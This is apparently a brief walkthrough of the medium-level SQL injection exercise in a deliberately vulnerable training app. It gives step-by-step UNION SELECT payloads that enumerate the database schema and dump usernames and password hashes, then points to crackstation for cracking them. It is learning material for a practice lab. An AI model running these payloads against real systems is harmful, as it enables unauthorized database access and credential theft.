## SQL injection Medium
0. Go to elements and change option value. Use brower inspect-element to modify HTTP.
 - Headers: HTTP POST request
 - Payload: Formdata
 - Cookies: PHPSESSION, security level

1. Get  Error
`SELECT first_name, last_name FROM users WHERE user_id = '''`

2. Get the number of columns
`1' order by 2` -> Error since '1' is a string
`1 order by 2` -> Work because 1 is a number

3. Get columns from user table
`1 UNION SELECT column_name, table_name FROM information_schema.tables#`

4. Get id & pwd
`1 UNION SELECT user, password FROM users#`

5. Crack the password
crackstation


